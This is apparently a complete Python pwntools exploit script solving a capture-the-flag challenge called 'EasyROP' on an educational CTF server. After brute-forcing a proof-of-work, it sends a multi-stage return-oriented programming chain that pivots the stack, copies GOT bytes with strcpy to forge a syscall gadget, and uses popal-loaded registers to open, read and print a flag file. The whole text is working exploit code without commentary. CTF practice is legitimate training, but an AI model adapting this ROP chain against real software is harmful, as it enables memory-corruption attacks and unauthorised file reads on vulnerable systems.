import sys
import random
from hashlib import sha256
from pwn import *

SLEEP = 1

if len(sys.argv) == 1:
    r = process('./EasyROP')
else:
    r = remote('eductf.zoolab.org', 20004)

    chal = r.recvline().strip()
    print chal

    n = 0
    while True:
        sol = '{:014}'.format(n)
        if sha256(chal + sol).hexdigest().startswith('dadada'):
            print sol
            r.send(sol)
            sleep(SLEEP)
            break
        n += 1
    print r.recvline().strip()

buf = 0x804a110
strcpy = 0x80484a0
read = 0x8048470

read_got = 0x8049fe0
null_buf = 0x8049ffc
got = 0x8049fd0

pop_ebp = 0x804886b
pop_pop = 0x804886a
pop_pop_pop = 0x8048869
leave_ret = 0x8048575
popal = 0x8048808
ret = 0x8048432

rop = p32(pop_ebp) + p32(buf+0x24)
rop += p32(0x8048775) + p32(buf) + p32(0x11111111)
payload = p32(ret)*11 + rop
r.send(payload)
sleep(SLEEP)

payload = p32(ret)*16
r.send(payload)
sleep(SLEEP)

flagpath = 0x804a128
flag = '/home/EasyROP/flag'
payload = p32(buf)*5 + p32(buf+0x3c) + flag + '\x00'*6 + p32(buf)*2
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x200) + p32(got)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x201) + p32(read_got+1)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x204) + p32(null_buf)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x205) + p32(null_buf)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x206) + p32(null_buf)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x207) + p32(null_buf)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x300) + p32(buf+0x200)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x400) + p32(buf+0x200)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x500) + p32(buf+0x200)
payload += p32(strcpy) + p32(pop_pop) + p32(buf+0x600) + p32(buf+0x200)
payload += p32(read) + p32(pop_pop_pop) + p32(0) + p32(buf+0x300-0x24) + p32(0x24)
payload += p32(read) + p32(pop_pop_pop) + p32(0) + p32(buf+0x400-0x24) + p32(0x24)
payload += p32(read) + p32(pop_pop_pop) + p32(0) + p32(buf+0x500-0x24) + p32(0x24)
payload += p32(read) + p32(pop_pop_pop) + p32(0) + p32(buf+0x300+0x20) + p32(0x4)
payload += p32(read) + p32(pop_pop_pop) + p32(0) + p32(buf+0x400+0x20) + p32(0x4)
payload += p32(read) + p32(pop_pop_pop) + p32(0) + p32(buf+0x500+0x20) + p32(0x4)
payload += p32(pop_ebp) + p32(buf+0x300-0x28) + p32(leave_ret)
payload += p32(0) + p32(buf+0x160) + p32(leave_ret)
r.sendline(payload)
sleep(SLEEP)

# edi, esi, ebp, skip, ebx, edx, ecx, eax
payload = p32(popal)
payload += p32(0)*2 + p32(buf+0x400-0x28)*2
payload += p32(flagpath) + p32(0) + p32(0) + p32(5)
r.send(payload)
sleep(SLEEP)

payload = p32(popal)
payload += p32(0)*2 + p32(buf+0x500-0x28)*2
payload += p32(3) + p32(0x100) + p32(buf) + p32(3)
r.send(payload)
sleep(SLEEP)

payload = p32(popal)
payload += p32(0)*2 + p32(buf+0x160)*2
payload += p32(1) + p32(0x100) + p32(buf) + p32(4)
r.send(payload)
sleep(SLEEP)

payload = p32(leave_ret)
r.send(payload)
sleep(SLEEP)

payload = p32(leave_ret)
r.send(payload)
sleep(SLEEP)

payload = p32(leave_ret)
r.send(payload)

r.interactive()